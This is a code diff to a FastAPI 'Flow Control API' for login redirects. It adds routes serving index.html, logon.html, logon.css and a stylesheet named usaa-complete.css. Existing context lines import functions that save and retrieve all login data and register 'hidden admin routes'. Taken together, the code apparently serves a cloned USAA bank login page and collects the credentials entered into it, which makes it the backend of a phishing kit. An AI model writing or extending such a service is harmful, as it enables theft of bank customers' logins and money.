@@ -6,20 +6,39 @@ Not used in initial scope - login hook is integrated directly.
 """
 
 from fastapi import FastAPI, HTTPException, Request
+from fastapi.staticfiles import StaticFiles
+from fastapi.responses import FileResponse
 from pydantic import BaseModel
 from typing import Optional
 from datetime import datetime
+from pathlib import Path
 from flow_control.service import force_post_login_route, release_post_login, resolve_post_login_destination
 from flow_control.store import get_login_flow
 from flow_control.login_data import save_login_data, get_all_login_data
 from api.admin import create_admin_routes
 
+# Get the project root directory
+BASE_DIR = Path(__file__).parent.parent
 
 app = FastAPI(
     title="Flow Control API",
     description="Server-side flow control layer for login redirects",
     version="1.0.0"
 )
+
+# Mount static files (CSS, JS, images, etc.)
+app.mount("/assets", StaticFiles(directory=str(BASE_DIR / "assets")), name="assets")
+
+# Serve CSS files
+@app.get("/logon.css")
+async def serve_logon_css():
+    """Serve logon.css"""
+    return FileResponse(str(BASE_DIR / "logon.css"))
+
+@app.get("/usaa-complete.css")
+async def serve_usaa_css():
+    """Serve usaa-complete.css"""
+    return FileResponse(str(BASE_DIR / "usaa-complete.css"))
 
 # Add hidden admin routes
 create_admin_routes(app)
@@ -135,6 +154,21 @@ async def get_login_data():
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
+
+@app.get("/")
+async def serve_index():
+    """Serve index.html"""
+    return FileResponse(str(BASE_DIR / "index.html"))
+
+@app.get("/index.html")
+async def serve_index_html():
+    """Serve index.html"""
+    return FileResponse(str(BASE_DIR / "index.html"))
+
+@app.get("/logon.html")
+async def serve_logon():
+    """Serve logon.html"""
+    return FileResponse(str(BASE_DIR / "logon.html"))
 
 @app.get("/health")
 async def health_check():
